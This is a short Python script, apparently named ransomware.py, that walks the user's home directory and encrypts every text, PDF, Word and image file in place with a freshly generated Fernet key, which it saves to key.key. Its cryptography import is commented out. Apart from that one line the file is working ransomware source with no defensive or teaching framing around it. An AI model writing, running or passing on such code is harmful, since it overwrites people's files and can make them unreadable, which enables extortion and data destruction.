#from cryptography.fernet import Fernet
import os
from pathlib import Path

def scan_user_folders():
    user_home = Path.home()
    all_files = []
    for root, dirs, files in os.walk(user_home):
        for file in files:
            file_path = os.path.join(root, file)
            all_files.append(file_path)
    return all_files

if __name__ == "__main__":
    files = scan_user_folders()
    print(f"\nFound {len(files)} files.")

    key = Fernet.generate_key()
    with open("key.key", "wb") as thekey:
        thekey.write(key)

    fernet = Fernet(key)

    for file in files:
        filename = os.path.basename(file)
        if filename in ("ransomware.py", "key.key"):
            continue
        # Optional: only encrypt specific file types
        if not file.endswith(('.txt', '.pdf', '.docx', '.jpg', '.png')):
            continue
        try:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = fernet.encrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)
            print(f"Encrypted {file}")
        except Exception as e:
            print(f"Failed to encrypt {file}: {e}")
